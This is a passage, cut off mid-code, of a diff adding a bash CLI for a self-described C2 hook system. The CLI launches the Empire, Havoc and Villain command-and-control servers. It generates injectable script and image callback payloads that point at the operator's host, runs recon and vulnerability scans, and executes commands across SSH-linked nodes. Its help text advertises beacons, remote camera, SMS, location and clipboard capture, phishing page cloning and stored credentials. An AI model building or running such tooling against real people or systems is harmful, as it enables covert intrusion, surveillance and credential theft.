@@ -1,0 +1,1104 @@
+#!/bin/bash
+# ══════════════════════════════════════════════════
+# hooks — C2 Hook System CLI
+# Manages hook server, callbacks, events, and C2 integrations
+# ══════════════════════════════════════════════════
+
+C2_HOME="${C2_HOME:-$HOME/c2}"
+HOOKSERVER="$C2_HOME/hookserver.py"
+PIDFILE="$C2_HOME/.hookserver.pid"
+DB="$C2_HOME/events.db"
+
+RED="\033[0;31m"; GRN="\033[0;32m"; YLW="\033[0;33m"
+CYN="\033[0;36m"; WHT="\033[1;37m"; DIM="\033[2m"
+RST="\033[0m"; BLD="\033[1m"
+
+usage() {
+  echo -e "${BLD}${CYN}╔══════════════════════════════════════════════╗${RST}"
+  echo -e "${BLD}${CYN}║   hooks — Event-Driven C2 Hook System        ║${RST}"
+  echo -e "${BLD}${CYN}╚══════════════════════════════════════════════╝${RST}"
+  echo ""
+  echo -e "  ${BLD}Server${RST}"
+  echo -e "    ${WHT}hooks start${RST}          Start hook + callback servers"
+  echo -e "    ${WHT}hooks stop${RST}           Stop servers"
+  echo -e "    ${WHT}hooks restart${RST}        Restart servers"
+  echo -e "    ${WHT}hooks status${RST}         Show server status"
+  echo ""
+  echo -e "  ${BLD}Events & Callbacks${RST}"
+  echo -e "    ${WHT}hooks events${RST}         Show recent events"
+  echo -e "    ${WHT}hooks callbacks${RST}      Show OOB callbacks"
+  echo -e "    ${WHT}hooks fire${RST} ${DIM}<type> <data>${RST}  Fire a test event"
+  echo -e "    ${WHT}hooks token${RST}          Generate unique callback token"
+  echo -e "    ${WHT}hooks url${RST}            Show callback URLs for testing"
+  echo ""
+  echo -e "  ${BLD}C2 Integration${RST}"
+  echo -e "    ${WHT}hooks empire${RST}         Start Empire teamserver"
+  echo -e "    ${WHT}hooks havoc${RST}          Start Havoc teamserver"
+  echo -e "    ${WHT}hooks villain${RST}        Start Villain server"
+  echo -e "    ${WHT}hooks starkiller${RST}     Open Starkiller GUI"
+  echo ""
+  echo -e "  ${BLD}Bug Bounty${RST}"
+  echo -e "    ${WHT}hooks bb add${RST} ${DIM}<domain> [program]${RST}  Add target"
+  echo -e "    ${WHT}hooks bb list${RST}                        List targets"
+  echo -e "    ${WHT}hooks bb scope${RST} ${DIM}<domain> <in|out>${RST}  Set scope"
+  echo -e "    ${WHT}hooks bb recon${RST} ${DIM}<domain>${RST}          Run recon pipeline"
+  echo -e "    ${WHT}hooks bb full${RST} ${DIM}<domain>${RST}           Full recon chain"
+  echo -e "    ${WHT}hooks bb subs${RST} ${DIM}<domain>${RST}           Subdomain enum only"
+  echo -e "    ${WHT}hooks bb ports${RST} ${DIM}<target>${RST}          Port scan only"
+  echo -e "    ${WHT}hooks bb nuclei${RST} ${DIM}<target>${RST}         Nuclei scan"
+  echo -e "    ${WHT}hooks bb report${RST} ${DIM}[program]${RST}        Generate report"
+  echo ""
+  echo -e "  ${BLD}Hooks${RST}"
+  echo -e "    ${WHT}hooks list${RST}           List installed hooks"
+  echo -e "    ${WHT}hooks add${RST} ${DIM}<name>${RST}     Create new hook script"
+  echo -e "    ${WHT}hooks edit${RST} ${DIM}<name>${RST}    Edit hook script"
+  echo -e "    ${WHT}hooks disable${RST} ${DIM}<name>${RST} Disable a hook"
+  echo -e "    ${WHT}hooks enable${RST} ${DIM}<name>${RST}  Enable a hook"
+  echo -e "    ${WHT}hooks log${RST}            Tail event log"
+  echo -e "    ${WHT}hooks dashboard${RST}      Open web dashboard"
+  echo ""
+  echo -e "  ${BLD}Mesh & AI${RST}"
+  echo -e "    ${WHT}hooks nodes${RST}          Show all mesh nodes + status"
+  echo -e "    ${WHT}hooks ollama${RST} ${DIM}<prompt>${RST} Query Ollama (auto-routes)"
+  echo -e "    ${WHT}hooks delegate${RST} ${DIM}<node> <cmd>${RST}  Run cmd on node"
+  echo -e "    ${WHT}hooks exec${RST} ${DIM}<cmd>${RST}    Run cmd on ALL nodes"
+  echo -e "    ${WHT}hooks sync${RST} ${DIM}[node|all]${RST} Sync C2 to nodes"
+  echo -e "    ${WHT}hooks pull${RST} ${DIM}[node]${RST}   Pull events from node"
+  echo ""
+  echo -e "  ${BLD}Device Intel${RST}"
+  echo -e "    ${WHT}hooks sms${RST} ${DIM}send|list|c2${RST}   Remote SMS"
+  echo -e "    ${WHT}hooks cam${RST} ${DIM}[0|1]${RST}          Remote camera"
+  echo -e "    ${WHT}hooks loc${RST}                Remote location"
+  echo -e "    ${WHT}hooks clip${RST}               Remote clipboard"
+  echo -e "    ${WHT}hooks ss${RST}                 Remote screenshot"
+  echo ""
+  echo -e "  ${BLD}Phishing${RST}"
+  echo -e "    ${WHT}hooks phish${RST} ${DIM}create|list|qr|serve|clone|captures${RST}"
+  echo -e "    ${WHT}hooks creds${RST}              Show stored credentials"
+  echo ""
+  echo -e "  ${BLD}Messaging${RST}"
+  echo -e "    ${WHT}hooks msg${RST} ${DIM}send|pending|list${RST}  Inter-node messages"
+  echo ""
+  echo -e "  ${BLD}Maintenance${RST}"
+  echo -e "    ${WHT}hooks update${RST}             Auto-update + sync all nodes"
+  echo ""
+  echo -e "  ${BLD}Beacon${RST}"
+  echo -e "    ${WHT}hooks beacon${RST}         Start beacon listener"
+  echo -e "    ${WHT}hooks heartbeat${RST}      Start sending heartbeats"
+  echo -e "    ${WHT}hooks dormant${RST} ${DIM}[secs]${RST} Go dormant (low-noise beacon)"
+  echo -e "    ${WHT}hooks ping${RST}           Show beacon status for all nodes"
+}
+
+cmd_start() {
+  if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
+    echo -e "${YLW}Hook server already running (PID $(cat "$PIDFILE"))${RST}"
+    return
+  fi
+  echo -e "${CYN}Starting C2 hook server...${RST}"
+  nohup python3 "$HOOKSERVER" >> "$C2_HOME/logs/server.log" 2>&1 &
+  echo $! > "$PIDFILE"
+  sleep 1
+  if kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
+    echo -e "${GRN}Hook server started (PID $(cat "$PIDFILE"))${RST}"
+    echo -e "  Webhook:  http://0.0.0.0:9800"
+    echo -e "  Callback: http://0.0.0.0:9801"
+    echo -e "  Dashboard: http://0.0.0.0:9800/dashboard"
+  else
+    echo -e "${RED}Failed to start. Check $C2_HOME/logs/server.log${RST}"
+  fi
+}
+
+cmd_stop() {
+  if [ -f "$PIDFILE" ]; then
+    PID=$(cat "$PIDFILE")
+    if kill -0 "$PID" 2>/dev/null; then
+      kill "$PID" 2>/dev/null
+      sleep 1
+      kill -9 "$PID" 2>/dev/null
+      echo -e "${GRN}Stopped (PID $PID)${RST}"
+    fi
+    rm -f "$PIDFILE"
+  else
+    echo -e "${DIM}Not running${RST}"
+    pkill -f "hookserver.py" 2>/dev/null
+  fi
+}
+
+cmd_restart() { cmd_stop; sleep 1; cmd_start; }
+
+cmd_status() {
+  echo -e "${BLD}C2 Hook System Status${RST}"
+  echo ""
+  if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
+    echo -e "  Hook Server:    ${GRN}running${RST} (PID $(cat "$PIDFILE"))"
+  else
+    echo -e "  Hook Server:    ${RED}stopped${RST}"
+  fi
+
+  # Check ports
+  for port in 9800 9801; do
+    if ss -tlnp 2>/dev/null | grep -q ":$port " || netstat -tlnp 2>/dev/null | grep -q ":$port "; then
+      echo -e "  Port $port:       ${GRN}listening${RST}"
+    else
+      echo -e "  Port $port:       ${RED}closed${RST}"
+    fi
+  done
+
+  if [ -f "$DB" ]; then
+    EVENTS=$(sqlite3 "$DB" "SELECT COUNT(*) FROM events" 2>/dev/null || echo "?")
+    CBS=$(sqlite3 "$DB" "SELECT COUNT(*) FROM callbacks" 2>/dev/null || echo "?")
+    echo -e "  Events logged:  ${WHT}$EVENTS${RST}"
+    echo -e "  Callbacks:      ${WHT}$CBS${RST}"
+  fi
+
+  # Beacon status
+  if pgrep -f "beacon.py serve" >/dev/null 2>&1; then
+    echo -e "  Beacon:         ${GRN}listening${RST} (:9802/HTTP + :5353/DNS)"
+  elif pgrep -f "beacon.py" >/dev/null 2>&1; then
+    echo -e "  Beacon:         ${YLW}heartbeat only${RST}"
+  else
+    echo -e "  Beacon:         ${DIM}stopped${RST}"
+  fi
+
+  echo ""
+  echo -e "  ${BLD}C2 Frameworks${RST}"
+  pgrep -f "empire.py\|powershell-empire" >/dev/null 2>&1 \
+    && echo -e "  Empire:         ${GRN}running${RST}" \
+    || echo -e "  Empire:         ${DIM}stopped${RST}"
+  pgrep -f "havoc server" >/dev/null 2>&1 \
+    && echo -e "  Havoc:          ${GRN}running${RST}" \
+    || echo -e "  Havoc:          ${DIM}stopped${RST}"
+  pgrep -f "Villain.py" >/dev/null 2>&1 \
+    && echo -e "  Villain:        ${GRN}running${RST}" \
+    || echo -e "  Villain:        ${DIM}stopped${RST}"
+  echo ""
+}
+
+cmd_events() {
+  if [ ! -f "$DB" ]; then echo "No events yet."; return; fi
+  echo -e "${BLD}Recent Events${RST}"
+  echo ""
+  sqlite3 -header -column "$DB" \
+    "SELECT id, substr(timestamp,1,19) as time, source, event_type, substr(data,1,60) as data, src_ip FROM events ORDER BY id DESC LIMIT ${1:-20}"
+}
+
+cmd_callbacks() {
+  if [ ! -f "$DB" ]; then echo "No callbacks yet."; return; fi
+  echo -e "${BLD}OOB Callbacks${RST}"
+  echo ""
+  sqlite3 -header -column "$DB" \
+    "SELECT id, substr(timestamp,1,19) as time, src_ip, method, substr(path,1,40) as path, token FROM callbacks ORDER BY id DESC LIMIT ${1:-20}"
+}
+
+cmd_fire() {
+  local etype="${1:-test}"
+  shift
+  local data="${*:-{\"test\":true}}"
+  echo -e "${CYN}Firing event: ${etype}${RST}"
+  curl -s -X POST "http://127.0.0.1:9800/${etype}" \
+    -H "Content-Type: application/json" \
+    -d "$data" | python3 -m json.tool 2>/dev/null || echo "Server not running?"
+}
+
+cmd_token() {
+  TOKEN=$(python3 -c "import hashlib,time,os; print(hashlib.sha256(f'{time.time()}{os.urandom(8).hex()}'.encode()).hexdigest()[:16])")
+  PORT=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('callback_port',9801))" 2>/dev/null || echo "9801")
+  TSIP=$(ip -4 -o addr show tailscale0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
+  [ -z "$TSIP" ] && TSIP="YOUR_IP"
+
+  echo -e "${BLD}Callback Token: ${GRN}${TOKEN}${RST}"
+  echo ""
+  echo -e "  ${WHT}HTTP:${RST}   http://${TSIP}:${PORT}/${TOKEN}"
+  echo -e "  ${WHT}IMG:${RST}    <img src=\"http://${TSIP}:${PORT}/${TOKEN}/x.png\">"
+  echo -e "  ${WHT}JS:${RST}     <script src=\"http://${TSIP}:${PORT}/${TOKEN}/x.js\"></script>"
+  echo -e "  ${WHT}SVG:${RST}    <img src=\"http://${TSIP}:${PORT}/${TOKEN}/x.svg\">"
+  echo -e "  ${WHT}CSS:${RST}    <link href=\"http://${TSIP}:${PORT}/${TOKEN}/x.css\" rel=\"stylesheet\">"
+  echo -e "  ${WHT}XML:${RST}    http://${TSIP}:${PORT}/${TOKEN}/x.xml"
+  echo -e "  ${WHT}Curl:${RST}   curl http://${TSIP}:${PORT}/${TOKEN}"
+  echo ""
+}
+
+cmd_url() {
+  PORT=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('callback_port',9801))" 2>/dev/null || echo "9801")
+  HPORT=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('hook_port',9800))" 2>/dev/null || echo "9800")
+  TSIP=$(ip -4 -o addr show tailscale0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
+  LANIP=$(ip -4 -o addr show wlan0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
+  [ -z "$LANIP" ] && LANIP=$(ip -4 -o addr show eth0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
+
+  echo -e "${BLD}C2 Hook URLs${RST}"
+  echo ""
+  echo -e "  ${WHT}Tailscale:${RST}"
+  echo -e "    Webhook:   http://${TSIP}:${HPORT}"
+  echo -e "    Callback:  http://${TSIP}:${PORT}"
+  echo -e "    Dashboard: http://${TSIP}:${HPORT}/dashboard"
+  echo ""
+  echo -e "  ${WHT}LAN:${RST}"
+  echo -e "    Webhook:   http://${LANIP}:${HPORT}"
+  echo -e "    Callback:  http://${LANIP}:${PORT}"
+  echo -e "    Dashboard: http://${LANIP}:${HPORT}/dashboard"
+  echo ""
+  echo -e "  ${WHT}Havoc webhook config:${RST}"
+  echo -e "    Url = \"http://${TSIP}:${HPORT}/havoc/event\""
+  echo ""
+}
+
+cmd_empire() {
+  echo -e "${CYN}Starting Empire teamserver...${RST}"
+  if pgrep -f "empire.py" >/dev/null 2>&1; then
+    echo -e "${YLW}Already running${RST}"
+    return
+  fi
+  cd /usr/share/powershell-empire
+  nohup python3 empire.py server >> "$C2_HOME/logs/empire.log" 2>&1 &
+  echo -e "${GRN}Empire started.${RST} API: http://127.0.0.1:1337"
+  echo -e "  Starkiller: ${WHT}hooks starkiller${RST}"
+  echo -e "  Logs: $C2_HOME/logs/empire.log"
+}
+
+cmd_havoc() {
+  local profile="${1:-$C2_HOME/havoc_profile.yaotl}"
+  if [ ! -f "$profile" ]; then
+    profile="/usr/share/havoc/profiles/havoc.yaotl"
+  fi
+  echo -e "${CYN}Starting Havoc teamserver...${RST}"
+  if pgrep -f "havoc server" >/dev/null 2>&1; then
+    echo -e "${YLW}Already running${RST}"
+    return
+  fi
+  nohup havoc server --profile "$profile" >> "$C2_HOME/logs/havoc.log" 2>&1 &
+  echo -e "${GRN}Havoc started.${RST} Port: 40056"
+  echo -e "  Client: ${WHT}havoc client${RST}"
+  echo -e "  Logs: $C2_HOME/logs/havoc.log"
+}
+
+cmd_villain() {
+  echo -e "${CYN}Starting Villain...${RST}"
+  if pgrep -f "Villain.py" >/dev/null 2>&1; then
+    echo -e "${YLW}Already running${RST}"
+    return
+  fi
+  cd /usr/share/villain
+  nohup python3 Villain.py >> "$C2_HOME/logs/villain.log" 2>&1 &
+  echo -e "${GRN}Villain started.${RST} HoaxShell: :8080 | Team: :6501 | RevTCP: :4443"
+}
+
+cmd_starkiller() {
+  echo -e "${CYN}Opening Starkiller...${RST}"
+  starkiller &>/dev/null &
+  echo -e "${GRN}Starkiller launched${RST}"
+}
+
+cmd_list() {
+  echo -e "${BLD}Installed Hooks${RST} ($C2_HOME/hooks.d/)"
+  echo ""
+  for f in "$C2_HOME/hooks.d/"*; do
+    [ -f "$f" ] || continue
+    name=$(basename "$f")
+    if [ -x "$f" ]; then
+      echo -e "  ${GRN}●${RST} $name"
+    else
+      echo -e "  ${RED}○${RST} $name ${DIM}(disabled)${RST}"
+    fi
+  done
+}
+
+cmd_add() {
+  local name="${1:?Usage: hooks add <event_type_name>}"
+  local file="$C2_HOME/hooks.d/${name}.sh"
+  cat > "$file" << 'TEMPLATE'
+#!/bin/bash
+# Hook: DESCRIPTION
+# Triggered on: EVENT_TYPE
+# Available env: $C2_EVENT, $C2_DATA, $C2_TIMESTAMP, $C2_HOME
+
+echo "Hook triggered: $C2_EVENT" >> "$C2_HOME/logs/hook_debug.log"
+
+# Your logic here:
+
+TEMPLATE
+  chmod +x "$file"
+  echo -e "${GRN}Created${RST}: $file"
+  ${EDITOR:-nano} "$file"
+}
+
+cmd_edit() {
+  local name="$1"
+  local file=$(find "$C2_HOME/hooks.d/" -name "*${name}*" | head -1)
+  [ -z "$file" ] && { echo "Hook not found: $name"; return 1; }
+  ${EDITOR:-nano} "$file"
+}
+
+cmd_disable() {
+  local name="$1"
+  local file=$(find "$C2_HOME/hooks.d/" -name "*${name}*" | head -1)
+  [ -z "$file" ] && { echo "Hook not found: $name"; return 1; }
+  chmod -x "$file"
+  echo -e "${YLW}Disabled${RST}: $(basename "$file")"
+}
+
+cmd_enable() {
+  local name="$1"
+  local file=$(find "$C2_HOME/hooks.d/" -name "*${name}*" | head -1)
+  [ -z "$file" ] && { echo "Hook not found: $name"; return 1; }
+  chmod +x "$file"
+  echo -e "${GRN}Enabled${RST}: $(basename "$file")"
+}
+
+cmd_log() {
+  tail -f "$C2_HOME/hookserver.log" "$C2_HOME/logs/all_events.log" 2>/dev/null
+}
+
+cmd_dashboard() {
+  PORT=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('hook_port',9800))" 2>/dev/null || echo "9800")
+  URL="http://127.0.0.1:${PORT}/dashboard"
+  echo -e "Dashboard: ${WHT}${URL}${RST}"
+  if command -v xdg-open &>/dev/null; then
+    xdg-open "$URL" 2>/dev/null &
+  elif command -v termux-open-url &>/dev/null; then
+    termux-open-url "$URL"
+  fi
+}
+
+# ── Bug Bounty ───────────────────────────────────
+RECON_DIR="$C2_HOME/recon"
+mkdir -p "$RECON_DIR" 2>/dev/null
+
+bb_add() {
+  local domain="${1:?Usage: hooks bb add <domain> [program]}"
+  local program="${2:-default}"
+  curl -s -X POST "http://127.0.0.1:9800/targets/add" \
+    -H "Content-Type: application/json" \
+    -d "{\"domain\":\"$domain\",\"program\":\"$program\"}" | python3 -m json.tool 2>/dev/null
+}
+
+bb_list() {
+  local program="$1"
+  local url="http://127.0.0.1:9800/targets"
+  [ -n "$program" ] && url="${url}?program=$program"
+  echo -e "${BLD}Targets${RST}"
+  echo ""
+  curl -s "$url" | python3 -c "
+import sys,json
+targets=json.load(sys.stdin)
+colors={'new':'\033[0;36m','recon':'\033[0;33m','testing':'\033[0;35m','done':'\033[0;32m'}
+for t in targets:
+    c=colors.get(t['status'],'\033[0m')
+    scope='IN' if t['scope']=='in' else '\033[0;31mOUT\033[0m'
+    print(f\"  {c}{t['status']:8}\033[0m [{scope}] \033[1m{t['domain']}\033[0m  ({t['program']})  {t.get('notes','')}\")
+" 2>/dev/null || echo "Server not running?"
+}
+
+bb_scope() {
+  local domain="${1:?Usage: hooks bb scope <domain> <in|out>}"
+  local scope="${2:?Specify: in or out}"
+  curl -s -X POST "http://127.0.0.1:9800/targets/update" \
+    -H "Content-Type: application/json" \
+    -d "{\"domain\":\"$domain\",\"scope\":\"$scope\"}" | python3 -m json.tool 2>/dev/null
+}
+
+bb_subs() {
+  local domain="${1:?Usage: hooks bb subs <domain>}"
+  local outdir="$RECON_DIR/$domain"
+  mkdir -p "$outdir"
+
+  echo -e "${CYN}Running subdomain enumeration on ${WHT}$domain${RST}"
+  curl -s -X POST "http://127.0.0.1:9800/targets/update" \
+    -H "Content-Type: application/json" \
+    -d "{\"domain\":\"$domain\",\"status\":\"recon\"}" >/dev/null 2>&1
+
+  subfinder -d "$domain" -silent -o "$outdir/subs.txt" 2>/dev/null
+  SUB_COUNT=0
+  [ -f "$outdir/subs.txt" ] && SUB_COUNT=$(wc -l < "$outdir/subs.txt")
+  echo -e "${GRN}Found ${WHT}$SUB_COUNT${GRN} subdomains${RST}"
+
+  # Store results
+  curl -s -X POST "http://127.0.0.1:9800/recon/store" \
+    -H "Content-Type: application/json" \
+    -d "{\"tool\":\"subfinder\",\"result_type\":\"subdomains\",\"data\":{\"domain\":\"$domain\",\"count\":$SUB_COUNT}}" >/dev/null 2>&1
+
+  # Fire event for hook chaining
+  curl -s -X POST "http://127.0.0.1:9800/recon/complete" \
+    -H "Content-Type: application/json" \
+    -d "{\"stage\":\"subdomain\",\"target\":\"$domain\",\"count\":$SUB_COUNT}" >/dev/null 2>&1
+
+  echo -e "  Results: $outdir/subs.txt"
+}
+
+bb_ports() {
+  local target="${1:?Usage: hooks bb ports <domain|ip>}"
+  local outdir="$RECON_DIR/$target"
+  mkdir -p "$outdir"
+
+  echo -e "${CYN}Running port scan on ${WHT}$target${RST}"
+
+  # Use subs if available, otherwise direct target
+  if [ -f "$outdir/subs.txt" ]; then
+    echo -e "${DIM}Using subdomain list ($(wc -l < "$outdir/subs.txt" 2>/dev/null || echo 0) hosts)${RST}"
+    naabu -list "$outdir/subs.txt" -silent -o "$outdir/ports.txt" 2>/dev/null
+  else
+    naabu -host "$target" -silent -o "$outdir/ports.txt" 2>/dev/null
+  fi
+
+  PORT_COUNT=0
+  [ -f "$outdir/ports.txt" ] && PORT_COUNT=$(wc -l < "$outdir/ports.txt")
+  echo -e "${GRN}Found ${WHT}$PORT_COUNT${GRN} open ports${RST}"
+
+  curl -s -X POST "http://127.0.0.1:9800/recon/store" \
+    -H "Content-Type: application/json" \
+    -d "{\"tool\":\"naabu\",\"result_type\":\"ports\",\"data\":{\"target\":\"$target\",\"count\":$PORT_COUNT}}" >/dev/null 2>&1
+
+  curl -s -X POST "http://127.0.0.1:9800/recon/complete" \
+    -H "Content-Type: application/json" \
+    -d "{\"stage\":\"ports\",\"target\":\"$target\",\"count\":$PORT_COUNT}" >/dev/null 2>&1
+
+  echo -e "  Results: $outdir/ports.txt"
+}
+
+bb_httpx() {
+  local target="${1:?Usage: hooks bb httpx <domain>}"
+  local outdir="$RECON_DIR/$target"
+  mkdir -p "$outdir"
+
+  echo -e "${CYN}Running HTTP probe on ${WHT}$target${RST}"
+
+  if [ -f "$outdir/subs.txt" ]; then
+    httpx -l "$outdir/subs.txt" -silent -status-code -title -tech-detect -o "$outdir/httpx.txt" 2>/dev/null
+  else
+    echo "$target" | httpx -silent -status-code -title -tech-detect -o "$outdir/httpx.txt" 2>/dev/null
+  fi
+  LIVE=0
+  [ -f "$outdir/httpx.txt" ] && LIVE=$(wc -l < "$outdir/httpx.txt")
+  echo -e "${GRN}Found ${WHT}$LIVE${GRN} live hosts${RST}"
+
+  curl -s -X POST "http://127.0.0.1:9800/recon/store" \
+    -H "Content-Type: application/json" \
+    -d "{\"tool\":\"httpx\",\"result_type\":\"live_hosts\",\"data\":{\"target\":\"$target\",\"count\":$LIVE}}" >/dev/null 2>&1
+
+  echo -e "  Results: $outdir/httpx.txt"
+}
+
+bb_nuclei() {
+  local target="${1:?Usage: hooks bb nuclei <domain>}"
+  local outdir="$RECON_DIR/$target"
+  mkdir -p "$outdir"
+
+  echo -e "${CYN}Running Nuclei scan on ${WHT}$target${RST}"
+
+  local input="$outdir/httpx.txt"
+  if [ -f "$input" ]; then
+    # Extract just URLs from httpx output
+    awk '{print $1}' "$input" > "$outdir/urls.txt"
+    nuclei -l "$outdir/urls.txt" -silent -severity medium,high,critical -o "$outdir/nuclei.txt" 2>/dev/null
+  else
+    nuclei -u "$target" -silent -severity medium,high,critical -o "$outdir/nuclei.txt" 2>/dev/null
+  fi
+
+  VULN_COUNT=0
+  [ -f "$outdir/nuclei.txt" ] && VULN_COUNT=$(wc -l < "$outdir/nuclei.txt")
+  echo -e "${GRN}Found ${WHT}$VULN_COUNT${GRN} vulnerabilities${RST}"
+
+  if [ "${VULN_COUNT:-0}" -gt 0 ] 2>/dev/null; then
+    curl -s -X POST "http://127.0.0.1:9800/vuln/found" \
+      -H "Content-Type: application/json" \
+      -d "{\"target\":\"$target\",\"count\":$VULN_COUNT,\"tool\":\"nuclei\"}" >/dev/null 2>&1
+  fi
+
+  echo -e "  Results: $outdir/nuclei.txt"
+}
+
+bb_recon() {
+  local domain="${1:?Usage: hooks bb recon <domain>}"
+  echo -e "${BLD}${CYN}═══ Recon Pipeline: $domain ═══${RST}"
+  bb_subs "$domain"
+  echo ""
+  bb_httpx "$domain"
+  echo ""
+  bb_ports "$domain"
+  echo ""
+  echo -e "${GRN}Recon complete.${RST} Run ${WHT}hooks bb nuclei $domain${RST} for vuln scan."
+
+  curl -s -X POST "http://127.0.0.1:9800/targets/update" \
+    -H "Content-Type: application/json" \
+    -d "{\"domain\":\"$domain\",\"status\":\"testing\"}" >/dev/null 2>&1
+}
+
+bb_full() {
+  local domain="${1:?Usage: hooks bb full <domain>}"
+  echo -e "${BLD}${CYN}═══ Full Recon Chain: $domain ═══${RST}"
+  bb_subs "$domain"
+  echo ""
+  bb_httpx "$domain"
+  echo ""
+  bb_ports "$domain"
+  echo ""
+  bb_nuclei "$domain"
+  echo ""
+
+  curl -s -X POST "http://127.0.0.1:9800/targets/update" \
+    -H "Content-Type: application/json" \
+    -d "{\"domain\":\"$domain\",\"status\":\"done\"}" >/dev/null 2>&1
+
+  echo -e "${BLD}${GRN}═══ Full chain complete ═══${RST}"
+  echo -e "  All results in: $RECON_DIR/$domain/"
+}
+
+bb_report() {
+  local program="${1:-default}"
+  local report="$RECON_DIR/report_${program}_$(date +%Y%m%d_%H%M).md"
+
+  echo -e "${CYN}Generating report for program: ${WHT}$program${RST}"
+
+  cat > "$report" << HEADER
+# Bug Bounty Report — $program
+**Generated:** $(date -u '+%Y-%m-%d %H:%M UTC')
+**Host:** $(hostname)
+
+## Targets
+HEADER
+
+  curl -s "http://127.0.0.1:9800/targets?program=$program" | python3 -c "
+import sys,json
+for t in json.load(sys.stdin):
+    print(f\"- **{t['domain']}** — scope: {t['scope']}, status: {t['status']}\")
+    print(f\"  Notes: {t.get('notes','—')}\")
+" >> "$report" 2>/dev/null
+
+  echo "" >> "$report"
+  echo "## Findings" >> "$report"
+
+  # Append nuclei findings for each target
+  for d in "$RECON_DIR"/*/nuclei.txt; do
+    [ -f "$d" ] || continue
+    target=$(basename "$(dirname "$d")")
+    count=$(wc -l < "$d" 2>/dev/null || echo 0)
+    echo "" >> "$report"
+    echo "### $target ($count findings)" >> "$report"
+    echo '```' >> "$report"
+    cat "$d" >> "$report"
+    echo '```' >> "$report"
+  done
+
+  echo "" >> "$report"
+  echo "## Events" >> "$report"
+  sqlite3 "$DB" "SELECT timestamp, event_type, data FROM events WHERE source LIKE '%recon%' OR event_type LIKE '%vuln%' ORDER BY id DESC LIMIT 20" 2>/dev/null | while IFS='|' read -r ts etype data; do
+    echo "- \`$ts\` **$etype**: ${data:0:100}" >> "$report"
+  done
+
+  echo -e "${GRN}Report: ${WHT}$report${RST}"
+}
+
+cmd_bb() {
+  local subcmd="${1:-help}"
+  shift 2>/dev/null
+  case "$subcmd" in
+    add)    bb_add "$@" ;;
+    list|ls) bb_list "$@" ;;
+    scope)  bb_scope "$@" ;;
+    subs)   bb_subs "$@" ;;
+    ports)  bb_ports "$@" ;;
+    httpx)  bb_httpx "$@" ;;
+    nuclei) bb_nuclei "$@" ;;
+    recon)  bb_recon "$@" ;;
+    full)   bb_full "$@" ;;
+    report) bb_report "$@" ;;
+    *)
+      echo -e "${BLD}Bug Bounty Commands${RST}"
+      echo -e "  ${WHT}bb add${RST} <domain> [program]  — Add target"
+      echo -e "  ${WHT}bb list${RST} [program]           — List targets"
+      echo -e "  ${WHT}bb scope${RST} <domain> <in|out>  — Set scope"
+      echo -e "  ${WHT}bb subs${RST} <domain>            — Subdomain enum"
+      echo -e "  ${WHT}bb ports${RST} <target>            — Port scan"
+      echo -e "  ${WHT}bb httpx${RST} <target>            — HTTP probe"
+      echo -e "  ${WHT}bb nuclei${RST} <target>           — Vuln scan"
+      echo -e "  ${WHT}bb recon${RST} <domain>            — subs+httpx+ports"
+      echo -e "  ${WHT}bb full${RST} <domain>             — Full chain + nuclei"
+      echo -e "  ${WHT}bb report${RST} [program]          — Generate markdown report"
+      ;;
+  esac
+}
+
+# ── Node Management ──────────────────────────────
+NODES_FILE="$C2_HOME/nodes.json"
+
+_node_ssh() {
+  local node="$1"; shift
+  local ssh_host=$(python3 -c "import json; n=json.load(open('$NODES_FILE'))['nodes']['$node']; print(n['ssh'])" 2>/dev/null)
+  local ssh_fb=$(python3 -c "import json; n=json.load(open('$NODES_FILE'))['nodes']['$node']; print(n.get('ssh_fallback',''))" 2>/dev/null)
+  local port=$(python3 -c "import json; n=json.load(open('$NODES_FILE'))['nodes']['$node']; print(n.get('port',22))" 2>/dev/null)
+
+  if [ "$port" != "22" ]; then
+    ssh -o ConnectTimeout=3 -p "$port" "$ssh_host" "$@" 2>/dev/null && return 0
+    [ -n "$ssh_fb" ] && ssh -o ConnectTimeout=3 -p "$port" "$ssh_fb" "$@" 2>/dev/null && return 0
+  else
+    ssh -o ConnectTimeout=3 "$ssh_host" "$@" 2>/dev/null && return 0
+    [ -n "$ssh_fb" ] && ssh -o ConnectTimeout=3 "$ssh_fb" "$@" 2>/dev/null && return 0
+  fi
+  return 1
+}
+
+cmd_nodes() {
+  echo -e "${BLD}C2 Mesh Nodes${RST}"
+  echo ""
+  python3 -c "
+import json, subprocess, sys
+nodes = json.load(open('$NODES_FILE'))['nodes']
+for name, n in nodes.items():
+    ts = n.get('tailscale','?')
+    role = n.get('role','?')
+    caps = ', '.join(n.get('capabilities',[])[:5])
+    ollama = '✓ ' + ','.join(m for m in (n.get('ollama') or {}).get('models',[])) if n.get('ollama') else '✗'
+    # Quick reachability check
+    host = n.get('ssh','')
+    port = n.get('port', 22)
+    if name == 'laptop':
+        status = '\033[0;32monline\033[0m'
+    else:
+        try:
+            r = subprocess.run(['ssh','-o','ConnectTimeout=2','-o','BatchMode=yes'] +
+                (['-p',str(port)] if port != 22 else []) +
+                [host, 'echo ok'], capture_output=True, timeout=4)
+            status = '\033[0;32monline\033[0m' if r.returncode == 0 else '\033[0;31moffline\033[0m'
+        except:
+            status = '\033[0;31moffline\033[0m'
+    print(f'  {status}  \033[1m{name:10}\033[0m  {role:8}  {ts:18}  ollama:{ollama}')
+    if caps:
+        print(f'             \033[2m{caps}\033[0m')
+" 2>/dev/null
+}
+
+# ── Ollama Routing ───────────────────────────────
+cmd_ollama() {
+  local prompt="${*:?Usage: hooks ollama <prompt>}"
+
+  # If tower tunnel needed, ensure it's up
+  if ! ss -tlnp 2>/dev/null | grep -q ":21434 "; then
+    ssh -fN -o ConnectTimeout=3 tower 2>/dev/null &
+  fi
+
+  python3 -c "
+import json, urllib.request, sys
+
+nodes_cfg = json.load(open('$NODES_FILE'))
+nodes = nodes_cfg['nodes']
+priority = nodes_cfg.get('ollama_priority', [])
+prompt = sys.argv[1]
+
